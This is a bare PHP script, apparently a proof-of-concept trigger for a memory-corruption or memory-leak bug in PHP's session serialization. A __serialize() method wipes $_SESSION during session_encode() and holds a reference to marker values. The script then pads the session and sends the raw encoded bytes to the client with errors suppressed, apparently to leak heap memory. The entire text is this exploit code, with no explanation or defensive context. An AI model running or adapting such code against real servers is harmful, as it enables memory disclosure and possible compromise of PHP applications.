<?php
error_reporting(0);
ini_set('session.serialize_handler', 'php_serialize');
class C {
    function __serialize() {
        $_SESSION = [];
        $leak = [0x41424344, 0x45464748];
        $GLOBALS['keepref'] =& $leak;
        return [];
    }
}
session_start();
$_SESSION['Lz'] = new C;
$_SESSION['s'] = str_repeat('A', 7);
for ($i = 0; $i < 8; $i++) { $_SESSION['k'.$i] = $i; }
$s = session_encode();
header('Content-Type: application/octet-stream');
echo $s;
